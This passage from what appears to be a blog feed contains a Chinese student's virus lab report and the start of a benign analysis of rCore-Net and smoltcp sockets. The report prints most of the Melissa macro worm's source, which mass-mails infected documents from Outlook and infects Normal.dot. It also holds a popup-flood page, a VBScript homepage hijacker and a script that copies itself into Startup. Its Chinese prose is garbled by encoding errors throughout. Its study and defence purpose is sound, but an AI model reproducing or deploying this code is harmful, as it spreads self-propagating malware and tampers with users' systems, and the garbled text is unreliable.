class="line">Options.ConfirmConversions &#x3D; (1-1): &#39;æ–‡ä»¶è½¬æ¢å¯¹è¯æ¡†ä¸æ˜¾ç¤º</span><br><span class="line"></span><br><span class="line">Options.VirusProtection &#x3D; (1-1): &#39;å®è­¦å‘Šå¯¹è¯æ¡†ä¸æ˜¾ç¤º</span><br><span class="line"></span><br><span class="line">Options.SaveNormalPrompt &#x3D; (1-1) &#39;Normal.dotè¢«ä¿®æ”¹åä¸æ˜¾ç¤ºå¯¹è¯æ¡†</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice</span><br><span class="line"></span><br><span class="line">Set UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)</span><br><span class="line"></span><br><span class="line">&#39;åˆ›å»ºoutlookåº”ç”¨ç¨‹åºå®ä¾‹å¯¹è±¡</span><br><span class="line"></span><br><span class="line">Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)</span><br><span class="line"></span><br><span class="line">&#39;è·å–MAPIå¯¹è±¡</span><br><span class="line"></span><br><span class="line">If System.PrivateProfileString(&quot;&quot;,</span><br><span class="line">&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;, &quot;Melissa&quot;)</span><br><span class="line">&lt;&gt; &quot;... by Kwyjibo&quot; Then</span><br><span class="line"></span><br><span class="line">If UngaDasOutlook &#x3D; &quot;Outlook&quot; Then</span><br><span class="line"></span><br><span class="line">DasMapiName.Logon &quot;profile&quot;, &quot;password&quot;</span><br><span class="line"></span><br><span class="line">For y &#x3D; 1 To DasMapiName.AddressLists.Count</span><br><span class="line"></span><br><span class="line">&#39;éå†åœ°å€ç°¿ï¼Œè¿›è¡Œé‚®ä»¶å‘é€æ“ä½œ</span><br><span class="line"></span><br><span class="line">Set AddyBook &#x3D; DasMapiName.AddressLists(y)</span><br><span class="line"></span><br><span class="line">x &#x3D; 1</span><br><span class="line"></span><br><span class="line">Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)</span><br><span class="line"></span><br><span class="line">For oo &#x3D; 1 To AddyBook.AddressEntries.Count</span><br><span class="line"></span><br><span class="line">Peep &#x3D; AddyBook.AddressEntries(x)</span><br><span class="line"></span><br><span class="line">&#39;è·å–ç¬¬ x ä¸ªæ”¶ä»¶äººçš„æ”¶ä»¶åœ°å€</span><br><span class="line"></span><br><span class="line">BreakUmOffASlice.Recipients.Add Peep</span><br><span class="line"></span><br><span class="line">&#39;åŠ å…¥æ”¶ä»¶äººçš„åœ°å€</span><br><span class="line"></span><br><span class="line">x &#x3D; x + 1</span><br><span class="line"></span><br><span class="line">If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.Count</span><br><span class="line"></span><br><span class="line">Next oo</span><br><span class="line"></span><br><span class="line">BreakUmOffASlice.Subject&#x3D; &quot;Important Message From &quot; &amp;</span><br><span class="line">Application.UserName &#39;è®¾ç½®é‚®ä»¶çš„ä¸»é¢˜</span><br><span class="line"></span><br><span class="line">BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ...</span><br><span class="line">don&#39;t show anyone else ;-)&quot; &#39;è®¾ç½®é‚®ä»¶çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">BreakUmOffASlice.Attachments.Add ActiveDocument.FullName &#39;åŠ å…¥é™„ä»¶</span><br><span class="line"></span><br><span class="line">BreakUmOffASlice.Send &#39;å‘é€é‚®ä»¶</span><br><span class="line"></span><br><span class="line">Peep &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">Next y</span><br><span class="line"></span><br><span class="line">DasMapiName.Logoff &#39;æ–­å¼€è¿æ¥</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;,</span><br><span class="line">&quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot; &#39; è®¾ç½®æ„ŸæŸ“æ ‡å¿—</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">&#39;*First</span><br><span class="line">Part</span><br><span class="line"></span><br><span class="line">Set ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)</span><br><span class="line"></span><br><span class="line">&#39;è·å–å½“å‰æ–‡æ¡£VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—çš„åç§°</span><br><span class="line"></span><br><span class="line">Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)</span><br><span class="line"></span><br><span class="line">&#39;è·å–Normal.dot VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—çš„åç§°</span><br><span class="line"></span><br><span class="line">NTCL &#x3D; NTI1.CodeModule.CountOfLines</span><br><span class="line"></span><br><span class="line">ADCL &#x3D; ADI1.CodeModule.CountOfLines</span><br><span class="line"></span><br><span class="line">BGN &#x3D; 2</span><br><span class="line"></span><br><span class="line">If ADI1.Name &lt;&gt; &quot;Melissa&quot; Then &#39;å¦‚æœå½“å‰æ–‡æ¡£ä¸ºæ„ŸæŸ“</span><br><span class="line"></span><br><span class="line">If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCL</span><br><span class="line"></span><br><span class="line">Set ToInfect &#x3D; ADI1</span><br><span class="line"></span><br><span class="line">ADI1.Name &#x3D; &quot;Melissa&quot;</span><br><span class="line"></span><br><span class="line">DoAD &#x3D; True</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">If NTI1.Name &lt;&gt; &quot;Melissa&quot; Then&#39;å¦‚æœ Normal.dot æœªæ„ŸæŸ“</span><br><span class="line"></span><br><span class="line">If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCL</span><br><span class="line"></span><br><span class="line">Set ToInfect &#x3D; NTI1</span><br><span class="line"></span><br><span class="line">NTI1.Name &#x3D; &quot;Melissa&quot; &#39;ä¿®æ”¹VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—ä¸º Mellisa</span><br><span class="line"></span><br><span class="line">DoNT &#x3D; True</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">If DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA</span><br><span class="line"></span><br><span class="line">&#39;å¼€å§‹æ„ŸæŸ“ Normal.dot</span><br><span class="line"></span><br><span class="line">If DoNT &#x3D; True Then</span><br><span class="line"></span><br><span class="line">Do While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">ADI1.CodeModule.DeleteLines 1</span><br><span class="line"></span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)</span><br><span class="line"></span><br><span class="line">Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;</span><br><span class="line"></span><br><span class="line">ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)</span><br><span class="line"></span><br><span class="line">BGN &#x3D; BGN + 1</span><br><span class="line"></span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">If DoAD &#x3D; True Then &#39;å¼€å§‹æ„ŸæŸ“å½“å‰æ–‡æ¡£</span><br><span class="line"></span><br><span class="line">Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">NTI1.CodeModule.DeleteLines 1</span><br><span class="line"></span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)</span><br><span class="line"></span><br><span class="line">Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;</span><br><span class="line"></span><br><span class="line">ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)</span><br><span class="line"></span><br><span class="line">BGN &#x3D; BGN + 1</span><br><span class="line"></span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">CYA:</span><br><span class="line"></span><br><span class="line">&#39;ä¿å­˜è¢«ä¿®æ”¹çš„å½“å‰æ–‡æ¡£å’ŒNormal.dot</span><br><span class="line"></span><br><span class="line">If NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name,</span><br><span class="line">&quot;Document&quot;) &#x3D; False) Then</span><br><span class="line"></span><br><span class="line">ActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullName</span><br><span class="line"></span><br><span class="line">ElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) Then</span><br><span class="line"></span><br><span class="line">ActiveDocument.Saved &#x3D; True</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">&#39;WORD&#x2F;Melissa written by Kwyjibo</span><br><span class="line"></span><br><span class="line">&#39;Works in both Word 2000 and Word 97</span><br><span class="line"></span><br><span class="line">&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!</span><br><span class="line"></span><br><span class="line">&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!</span><br><span class="line"></span><br><span class="line">If Day(Now) &#x3D; Minute(Now) Then</span><br><span class="line"></span><br><span class="line">Selection.TypeText &quot; Twenty-two points, plus triple-word-score, plus</span><br><span class="line">fifty points for using all my letters. Game&#39;s over. I&#39;m outta</span><br><span class="line">here.&quot;</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><ol><li><p> ä¿®æ”¹æ³¨å†Œè¡¨</p></li><li><p> å‘é€é‚®ä»¶</p></li></ol><h2 id="HTMLç—…æ¯’"><a href="#HTMLç—…æ¯’" class="headerlink" title="HTMLç—…æ¯’"></a>HTMLç—…æ¯’</h2><h4 id="æ— é™è·³çª—å£ç—…æ¯’"><a href="#æ— é™è·³çª—å£ç—…æ¯’" class="headerlink" title="æ— é™è·³çª—å£ç—…æ¯’"></a>æ— é™è·³çª—å£ç—…æ¯’</h4> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;A href=<span class="string">&quot;&quot;</span> onmouseover=<span class="string">&quot;while(true)&#123;window.open()&#125;&quot;</span>&gt;æ¶æ„å¼¹å‡ºçª—å£ï¼&lt;/A&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>å°†æ­¤ç—…æ¯’è¿è¡Œåœ¨ç°å®ä¸­çš„ chrome æµè§ˆå™¨ä¸Šï¼Œç³»ç»Ÿæç¤º<br>é˜»æ­¢å¼¹å‡ºçª—å£ï¼Œè¡¨æ˜ç°è¡Œçš„æµè§ˆå™¨å·²ç»å¯¹è¿™ç§ç—…æ¯’è¿›è¡Œäº†é˜²æŠ¤</p><h4 id="æ›´æ”¹ä¸»é¡µç—…æ¯’"><a href="#æ›´æ”¹ä¸»é¡µç—…æ¯’" class="headerlink" title="æ›´æ”¹ä¸»é¡µç—…æ¯’"></a>æ›´æ”¹ä¸»é¡µç—…æ¯’</h4><p>é€šè¿‡ VbScript åµŒå…¥ html çš„ script æ ‡ç­¾ï¼Œ åµŒå…¥ä¸€æ®µvbä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">http-equiv</span>=<span class="string">Content-Type</span> <span class="attr">content</span>=<span class="string">&quot;text/html:charset=gb2312&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Sub main()</span><br><span class="line"></span><br><span class="line">Dim TheForm</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">Set</span> TheForm=Document.formsï¼ˆ<span class="string">&quot;myform&quot;</span>ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">strKey=<span class="string">&quot;HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">strValue=<span class="string">&quot;Start Page&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">strData=<span class="string">&quot;http://www.simpleware.com.cn&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">strType =<span class="string">&quot;REG_SZ&quot;</span></span></span><br><span class="line"></span><br><span class="line">regAdd strKeyï¼ŒstrValueï¼ŒstrDataï¼ŒstrType</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="comment">&lt;!--ä¸Šæ–¹ main scriptä¸»ä½“ï¼Œè°ƒç”¨regAdd å‡½æ•° è¿›è¡Œæ³¨å†Œè¡¨é¡¹çš„æ›´æ”¹--&gt;</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">regAdd</span>ï¼ˆ<span class="title">strKey</span>ï¼Œ<span class="title">strValue</span>ï¼Œ<span class="title">strData</span>ï¼Œ<span class="title">strType</span>ï¼‰</span></span></span><br><span class="line"></span><br><span class="line">Dim Wshshell</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">Set</span> WshShell=CreateObjectï¼ˆ<span class="string">&quot;WScript.Shell&quot;</span>ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">WshShell.RegWrite strKey &amp; <span class="string">&quot;&quot;</span> &amp; strValue,strData,strType</span></span><br><span class="line"></span><br><span class="line">&lt;!é€šè¿‡ shell æ–‡ä»¶è¿›è¡Œæ³¨å†Œè¡¨é¡¹çš„æ”¹å†™&gt;</span><br><span class="line"></span><br><span class="line"><span class="javascript">msgboxï¼ˆ<span class="string">&quot;Successful&quot;</span>ï¼‰</span></span><br><span class="line"></span><br><span class="line">&lt;!æ”¹å†™æˆåŠŸå æ˜¾ç¤º successful&gt;</span><br><span class="line"></span><br><span class="line"><span class="javascript">end <span class="function"><span class="keyword">function</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;main()&quot;</span>&gt;</span></span><br><span class="line">ä¿®æ”¹ä¸»é¡µ</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image22.jpeg" class="" width="22"><p>æ³¨å†Œè¡¨ä¿®æ”¹æˆåŠŸ</p><p>äº”ã€é˜²æ²»æ–¹æ³•ï¼š<br>5.1è¦é¿å…è¢«ç½‘é¡µæ¶æ„ä»£ç æ„ŸæŸ“ï¼Œé¦–å…ˆå…³é”®æ˜¯ä¸è¦è½»æ˜“å»ä¸€äº›å¹¶ä¸ä¿¡ä»»çš„ç«™ç‚¹ã€‚<br>5.2IEç‚¹å‡»â€å·¥å…·â€“&gt;Interneté€‰é¡¹â€“&gt;å®‰å…¨â€“&gt;InternetåŒºåŸŸçš„å®‰å…¨çº§åˆ«â€ï¼ŒæŠŠå®‰å…¨çº§åˆ«ç”±â€ä¸­â€æ”¹ä¸ºâ€é«˜â€ã€‚<br>5.3å…·ä½“æ–¹æ¡ˆæ˜¯ï¼šåœ¨IEçª—å£ä¸­ç‚¹å‡»â€å·¥å…·â€”&gt;Interneté€‰é¡¹â€ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é€‰æ‹©â€å®‰å…¨â€æ ‡ç­¾ï¼Œå†ç‚¹å‡»â€è‡ªå®šä¹‰çº§åˆ«â€æŒ‰é’®ï¼Œå°±ä¼šå¼¹å‡ºâ€å®‰å…¨è®¾ç½®â€å¯¹è¯æ¡†ï¼ŒæŠŠå…¶ä¸­æ‰€æœ‰Acti<br>veXæ’ä»¶å’Œæ§ä»¶ä»¥åŠä¸Javaç›¸å…³å…¨éƒ¨é€‰é¡¹é€‰æ‹©â€ç¦ç”¨â€ã€‚<br>5.4ä¸€å®šè¦åœ¨è®¡ç®—æœºä¸Šå®‰è£…é˜²ç«å¢™ï¼Œå¹¶è¦æ—¶åˆ»æ‰“å¼€â€å®æ—¶ç›‘æ§åŠŸèƒ½â€ã€‚<br>5.5åœ¨æ³¨å†Œè¡¨çš„KEY<em>CURRENT</em>USERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystemä¸‹ï¼Œå¢åŠ åä¸ºDisableRegistryToolsçš„DWORDå€¼é¡¹ï¼Œå°†å…¶å€¼æ”¹ä¸ºâ€1â€ï¼Œå³å¯ç¦æ­¢ä½¿ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨å‘½ä»¤regedit.exeã€‚<br>5.6å› ä¸ºç‰¹æ®ŠåŸå› éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯åº”ç”¨å¦‚ä¸‹è§£é”æ–¹æ³•ï¼šå¼€å§‹å› ä¸ºç‰¹æ®ŠåŸå› éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯åº”ç”¨å¦‚ä¸‹è§£é”æ–¹æ³•ï¼šè¿è¡Œâ€”&gt;gpedit.mscæ‰“å¼€ç»„ç­–ç•¥å·¦é¢åˆ†çº§å±•å¼€ç”¨æˆ·é…ç½®â€”&gt;ç®¡ç†æ¨¡æ¿â€”â€“&gt;ç³»ç»Ÿå³é¢æœ‰ä¸ªé˜»æ­¢è®¿é—®æ³¨å†Œè¡¨ç¼–è¾‘å·¥å…·è®¾ç½®æˆå·²ç¦ç”¨ç¡®å®šå³å¯ã€‚<br>5.7éšæ—¶å‡çº§IEæµè§ˆå™¨çš„è¡¥ä¸ã€‚<br>ã€å®éªŒæ€è€ƒã€‘<br>1.å¯æ ¹æ®â€å‡ ä¸ªç›¸å…³ä¿®æ”¹â€ä¸­æåˆ°çš„æ³¨å†Œè¡¨ä¸­å€¼ï¼Œåˆ©ç”¨â€æ›´æ”¹ä¸»é¡µâ€ä¸­ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹æ³•ï¼Œæ¥è¿›è¡Œè‡ªå·±çš„æ³¨å†Œè¡¨ä¿®æ”¹ï¼Œå¹¶ç»™å‡ºå¦‚ä½•é˜²èŒƒå’Œä¿®å¤ã€‚</p><h2 id="è„šæœ¬ç—…æ¯’"><a href="#è„šæœ¬ç—…æ¯’" class="headerlink" title="è„šæœ¬ç—…æ¯’"></a>è„šæœ¬ç—…æ¯’</h2><p>è‡ªåŠ¨æ‹·è´åˆ°å¼€å§‹èœå•å¯åŠ¨æ é¡¹</p><blockquote><p>On Error Resume Nextâ€™å¯åŠ¨æˆ–å…³é—­ä¸€ä¸ªé”™è¯¯å¤„ç†å¸¸å¼</p><p>Set<br>fs=CreateObject(â€œScripting.FileSystemobjectâ€)â€™åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¯¹Activexå¯¹è±¡çš„å¼•ç”¨</p><p>Set diro=fs.GetSpecialFolder(0)â€™å–ç³»ç»Ÿè·¯å¾„C:windows</p><p>dirl=Mid(dir0,1,InStr(dir0,â€:â€))â€™å–ç³»ç»Ÿç›˜ç¬¦</p><p>Set so=CreateObjectï¼ˆâ€Scripting.FileSystemObjectâ€ï¼‰</p><p>dim râ€™å®šä¹‰å˜é‡</p><p>Set r=Create0bject(â€œWscript.Shel1â€)â€™åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¯¹<br>Activexå¯¹è±¡çš„å¼•ç”¨</p><p>so.GetFile(WScript.ScriptFullName).Copy(dirl&amp;â€Documents and<br>SettingsAdministrator[å¼€å§‹]èœå•ç¨‹åºå¯åŠ¨Win32system.vbsâ€)</p><p>â€˜æ‹·è´æ–‡ä»¶</p></blockquote><h2 id="ç—…æ¯’åˆ†æ-1"><a href="#ç—…æ¯’åˆ†æ-1" class="headerlink" title="ç—…æ¯’åˆ†æ"></a>ç—…æ¯’åˆ†æ</h2><p>æ–‡ä»¶ç›‘æ§</p><p>å­¦ä¼šäº†Process Monitor çš„ä½¿ç”¨ï¼Œè¿™ä¸ªè½¯ä»¶ç°åœ¨ä»ç„¶æ´»è·ƒåœ¨ä»Šæ—¥çš„èˆå°</p><p>1.8æ³¨æ„ï¼Œä¸è¦æŠŠexplorer.exeå’Œiexplore.exeè¿™ä¸¤ä¸ªè¿›ç¨‹è¿‡æ»¤æ‰ï¼Œå› ä¸ºç—…æ¯’ç»å¸¸è¦æ³¨å…¥ä»£ç åˆ°è¿™ä¸¤ä¸ªè¿›ç¨‹ä¸­å®Œæˆç‰¹åˆ«çš„åŠŸèƒ½ã€‚å¦‚æœè¿‡æ»¤æ‰è¿™ä¸¤ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆå°±æ— æ³•ç›‘æ§åˆ°è¢«æ³¨å…¥åˆ°è¿™ä¸¤ä¸ªè¿›ç¨‹çš„ä»£ç æ‰€è¿›è¡Œçš„æ–‡ä»¶æ“ä½œã€‚</p><p>æ³¨å†Œè¡¨ç›‘æ§ ï¼š æ ¹æ® operation è¿‡æ»¤é¡¹ï¼ŒæŸ¥çœ‹ RegSetValue<br>å³æ›´æ”¹äº†æ³¨å†Œè¡¨é¡¹çš„è¿›ç¨‹</p><p>è¿›ç¨‹ç›‘æ§äºŒ ï¼š å­¦ä¼šä½¿ç”¨ Process Explorer</p><p>ç½‘ç»œç›‘æ§ï¼šåˆ©ç”¨ TcpView å·¥å…·è¿›è¡Œ ç«¯å£ï¼Œè¿›ç¨‹çš„ç½‘ç»œè¿æ¥ç›‘æ§ï¼Œnetspy<br>è¿›è¡Œä¾µå…¥å¹¶æ‰“å¼€7306ç«¯å£ç­‰å¾… netmonitor çš„ç›‘æ§ï¼Œå¯ä»¥æŸ¥çœ‹è®¡ç®—æœºä¸­çš„æ–‡ä»¶</p><p>å…¨é¢ç›‘æ§ï¼š åˆ©ç”¨ InCtrl5 å¯¹å®‰è£…ç¨‹åºçš„å®‰è£…è¿‡ç¨‹è¿›è¡Œæ–‡ä»¶ï¼Œæ³¨å†Œè¡¨é¡¹ï¼ŒINIï¼ŒTXT<br>æ–‡ä»¶çš„å…¨é¢è·Ÿè¸ªï¼Œä»è€Œå®ç°å¯¹å®‰è£…è¿‡ç¨‹çš„å…¨é¢äº†è§£ï¼Œå¹¶ç”Ÿæˆä¸€ä»½æŠ¥å‘Šï¼Œä¾›æŸ¥é˜…</p><h1 id="è‡´-è°¢"><a href="#è‡´-è°¢" class="headerlink" title="è‡´ è°¢"></a>è‡´ è°¢</h1><p>æ„Ÿè°¢è€å¸ˆ å’Œ å­¦é•¿çš„å¸®åŠ©å’ŒæŒ‡å¯¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore-net åŠ smoltcp åˆ†æ</title>
      <link href="/2020/09/30/Analysis%20of%20rCore-Net/"/>
      <url>/2020/09/30/Analysis%20of%20rCore-Net/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯ <code>rCore-Net</code> é¡¹ç›®å‰å¯¹äº rCore-net å’Œ smoltcp çš„åˆ†æ</p><a id="more"></a><h1 id="rCore-Net-åˆ†æ"><a href="#rCore-Net-åˆ†æ" class="headerlink" title="rCore-Net åˆ†æ"></a>rCore-Net åˆ†æ</h1><p>rCore-Net ä¸»è¦å€Ÿç”¨ smoltcp çš„crate ï¼Œä¸»è¦å®Œæˆäº†ï¼ŒTCPï¼ŒUDPï¼ŒRAWï¼ŒPACKETï¼ˆä½œä¸ºä»¥å¤ªç½‘å‡ºå£ï¼‰ï¼ŒNetlink ç­‰ç»“æ„å’Œç›¸å…³åŠŸèƒ½ã€‚</p><h2 id="æ€»ä½“ç»“æ„ï¼š"><a href="#æ€»ä½“ç»“æ„ï¼š" class="headerlink" title="æ€»ä½“ç»“æ„ï¼š"></a>æ€»ä½“ç»“æ„ï¼š</h2><p><strong>SOCKETS</strong> ï¼šsmoltcpæ˜¯å•çº¿ç¨‹çš„ç½‘ç»œåè®®æ ˆï¼Œå®šä¹‰ä¸€ä¸ªå…¨å±€çš„äº’æ–¥é”ï¼Œä»¥ä¿è¯æ“ä½œçš„äº’æ–¥æ€§</p><h3 id="å››ç§-SocketState"><a href="#å››ç§-SocketState" class="headerlink" title="å››ç§ SocketState"></a>å››ç§ SocketState</h3><p>TCPï¼šåˆ©ç”¨TCPåè®®çš„æ–¹å¼ï¼Œ</p><p>UDPï¼šåˆ©ç”¨UDpåè®®çš„æ–¹å¼</p><p>Rawï¼šå¯ç”¨äºæ¥å—å…¶ä»–åè®®çš„æ•°æ®</p><p>Packetï¼šæ²¡æœ‰çŠ¶æ€ï¼Œåªç”¨äºä»¥å¤ªç½‘å‡ºå£</p><p>Netlinkï¼šåŸºäºsocketçš„é€šä¿¡æœºåˆ¶å®ç°çš„å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´çš„é”€é‡æ•°æ®çš„åŠæ—¶äº¤äº’</p><h3 id="SocketState-çš„-imp-å‡½æ•°ä»¬"><a href="#SocketState-çš„-imp-å‡½æ•°ä»¬" class="headerlink" title="SocketState çš„ imp å‡½æ•°ä»¬"></a>SocketState çš„ imp å‡½æ•°ä»¬</h3><p>read ï¼š ä» buffer ä¸­å–å‡ºå°½å¯èƒ½å¤šçš„æ•°æ®ï¼Œæ”¾åˆ°ä¸€ä¸ª u8æ•°ç»„ï¼Œï¼ˆdataï¼‰ ä¸­</p><p>write ï¼š </p><ul><li>Tcp å‘é€åˆ°è¿æ¥çš„è¿œç¨‹ endpoint  </li><li>Udp å‘é€åˆ°å‚æ•°æŒ‡å®šçš„è¿œç¨‹ endpoint  </li><li>Raw å¦‚æœå¤´éƒ¨åŒ…å«åœ¨è€ƒè™‘èŒƒå›´åˆ™å¯ä»¥ç›´æ¥å‘é€ï¼Œå¦åˆ™è‡ªå·±ç»„ä¸€ä¸ª ip packetåŒ…ï¼Œå‘é€åˆ°æŒ‡å®šè¿œç¨‹ endpoint(é€šè¿‡å°†è¿œç¨‹åœ°å€å¡«å…¥å¤´éƒ¨ destinationå¤„)</li></ul><p>poll ï¼š æ£€æŸ¥socketçŠ¶æ€ ï¼Œ è¿”å›ï¼ˆæ˜¯å¦æ­£å¸¸ï¼Œæ˜¯å¦èƒ½æ¥æ”¶ï¼Œæ˜¯å¦èƒ½å‘é€ï¼‰</p><p>connect ï¼š ä¸è¿œç¨‹ endpoint è¿æ¥ ï¼Œé€šè¿‡è®¾ç½®remote_endpoint, Tcpéœ€è¦åˆ†é…ä¸€ä¸ªä¸´æ—¶çš„ port ã€‚</p><p>bind ï¼š å°† socket ç»‘å®šä¸€ä¸ªæœ¬åœ°çš„ ip</p><p>listen ï¼š å¦‚æœæ²¡æœ‰listenå¯¹åº”çš„ç«¯å£ï¼Œå°±å¼€å¯listenï¼Œå¦åˆ™ä¸æ“ä½œ</p><p>shutdown : å…³é—­socket</p><p>accept ï¼š Tcp ä»è¿æ¥äº‹ä»¶é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªæ—¶é—´ï¼Œå»ºç«‹æ–°çš„socket å¹¶æ›¿æ¢å½“å‰çš„socket</p><p>local_endpoint  : è¿”å›æœ¬åœ°ip</p><p>remote_endpoint : è¿”å›è¿œç¨‹ ip</p><p>box_clone :  cloneä¸€ä¸ªè‡ªèº«å¯¹è±¡</p><p><strong>ioctl ï¼š TODO</strong></p><h2 id="å‡½æ•°çš„æ™®éè¿‡ç¨‹"><a href="#å‡½æ•°çš„æ™®éè¿‡ç¨‹" class="headerlink" 